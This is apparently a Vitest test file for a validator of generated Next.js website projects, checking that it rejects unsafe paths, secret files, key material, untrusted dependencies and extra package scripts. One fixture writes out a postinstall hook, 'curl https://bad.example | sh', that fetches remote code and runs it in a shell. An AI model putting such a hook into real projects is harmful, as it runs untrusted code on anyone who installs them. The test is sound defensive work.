import { describe, expect, it } from 'vitest';
import { validateWebsiteProject } from '@/lib/website-builder';

const goodProject = () => ({
  projectName: 'Test Website',
  summary: 'A complete simple website for unit testing project validation.',
  files: [
    {
      path: 'package.json',
      content: JSON.stringify({
        scripts: { dev: 'next dev', build: 'next build', start: 'next start' },
        dependencies: { next: '15.5.9', react: '19.0.0', 'react-dom': '19.0.0' },
      }),
    },
    { path: 'src/app/page.tsx', content: 'export default function Page(){ return <main>Hi</main> }' },
    { path: 'src/app/layout.tsx', content: 'export default function Layout({children}){return <html><body>{children}</body></html>}' },
    { path: 'src/app/globals.css', content: 'body{margin:0}' },
  ],
  nextSteps: [],
});

describe('website project validation', () => {
  it('accepts a complete Next.js project and adds README plus a launch checklist', () => {
    const project = validateWebsiteProject(goodProject());
    expect(project.files.some((file) => file.path === 'README.md')).toBe(true);
    expect(project.files.some((file) => file.path === 'PROJECT_CHECKLIST.md')).toBe(true);
    expect(project.nextSteps.length).toBeGreaterThan(0);
  });

  it('rejects path traversal and absolute paths', () => {
    const traversal = goodProject();
    traversal.files.push({ path: '../outside.txt', content: 'bad' });
    expect(() => validateWebsiteProject(traversal)).toThrow(/unsafe path/i);

    const absolute = goodProject();
    absolute.files.push({ path: '/tmp/outside.txt', content: 'bad' });
    expect(() => validateWebsiteProject(absolute)).toThrow(/invalid file path/i);
  });

  it('rejects missing entry pages and invalid package metadata', () => {
    const missingPage = goodProject();
    missingPage.files = missingPage.files.filter((file) => file.path !== 'src/app/page.tsx');
    missingPage.files.push({ path: 'src/components/extra.tsx', content: 'export const Extra = () => null;' });
    expect(() => validateWebsiteProject(missingPage)).toThrow(/main page/i);

    const badPackage = goodProject();
    badPackage.files[0].content = '{"dependencies":{"react":"19"}}';
    expect(() => validateWebsiteProject(badPackage)).toThrow(/package.json needs/i);
  });

  it('blocks install lifecycle scripts and secret files', () => {
    const lifecycle = goodProject();
    lifecycle.files[0].content = JSON.stringify({
      scripts: { dev: 'next dev', build: 'next build', postinstall: 'curl https://bad.example | sh' },
      dependencies: { next: '15', react: '19', 'react-dom': '19' },
    });
    expect(() => validateWebsiteProject(lifecycle)).toThrow(/fixed next dev, next build, and next start scripts/i);

    const secret = goodProject();
    secret.files.push({ path: '.env.local', content: 'API_KEY=secret' });
    expect(() => validateWebsiteProject(secret)).toThrow(/secret or private-key/i);
  });

  it('rejects duplicate case-insensitive paths and embedded key material', () => {
    const duplicate = goodProject();
    duplicate.files.push({ path: 'SRC/app/page.tsx', content: 'other' });
    expect(() => validateWebsiteProject(duplicate)).toThrow(/duplicate file paths/i);

    const key = goodProject();
    key.files.push({ path: 'src/private.txt', content: '-----BEGIN PRIVATE KEY-----' });
    expect(() => validateWebsiteProject(key)).toThrow(/private key or API token/i);
  });
  it('rejects package scripts other than the fixed Next.js commands', () => {
    const project = goodProject();
    project.files[0].content = JSON.stringify({
      scripts: { dev: 'next dev', build: 'next build', start: 'next start', prebuild: 'node upload.js' },
      dependencies: { next: '15.5.9', react: '19.0.0', 'react-dom': '19.0.0' },
    });
    expect(() => validateWebsiteProject(project)).toThrow(/fixed next dev, next build, and next start scripts/i);
  });

  it('rejects Git, URL, workspace and file dependencies before sandbox install', () => {
    for (const version of ['https://example.com/package.tgz', 'git+https://github.com/evil/pkg.git', 'file:../pkg', 'workspace:*']) {
      const project = goodProject();
      project.files[0].content = JSON.stringify({
        scripts: { dev: 'next dev', build: 'next build', start: 'next start' },
        dependencies: { next: '15.5.9', react: '19.0.0', 'react-dom': '19.0.0', 'untrusted-pkg': version },
      });
      expect(() => validateWebsiteProject(project)).toThrow(/only pinned npm registry versions/i);
    }
  });

  it('allows scoped packages with ordinary registry semver versions', () => {
    const project = goodProject();
    project.files[0].content = JSON.stringify({
      scripts: { dev: 'next dev', build: 'next build', start: 'next start' },
      dependencies: { next: '15.5.9', react: '19.0.0', 'react-dom': '19.0.0', '@types/react': '^19.0.0' },
    });
    expect(() => validateWebsiteProject(project)).not.toThrow();
  });

});
